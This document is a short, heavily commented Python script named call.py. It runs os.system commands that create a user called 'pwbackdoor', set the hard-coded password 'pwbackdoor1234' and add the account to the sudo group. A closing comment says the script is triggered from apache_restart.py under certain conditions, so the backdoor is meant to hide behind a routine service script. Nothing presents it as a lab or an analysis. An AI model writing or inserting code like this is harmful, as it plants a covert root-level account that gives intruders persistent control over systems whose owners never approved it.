# call.py

# We are importing the os library, which provides a portable way of using operating system dependent functionality
# such as reading or writing to the environment and creating or destroying files.
import os

# The os.system() function allows us to execute system-level commands from Python.
# In this case, we are using it to create a new user, set a password for the user, and add the user to the sudo group.

# This line will execute the 'useradd' command to add a new user named 'pwbackdoor'.
os.system("sudo useradd pwbackdoor")

# This line will use the 'chpasswd' command to change the password of the user 'pwbackdoor' to 'pwbackdoor1234'.
os.system("echo pwbackdoor:pwbackdoor1234 | sudo chpasswd")
    
# This line will use the 'usermod' command to add the user 'pwbackdoor' to the 'sudo' group,
# which will give them the ability to execute commands with superuser privileges.
os.system("sudo usermod -aG sudo pwbackdoor")

# Note: This script (call.py) will be called from another script (apache_restart.py) when certain conditions are met.

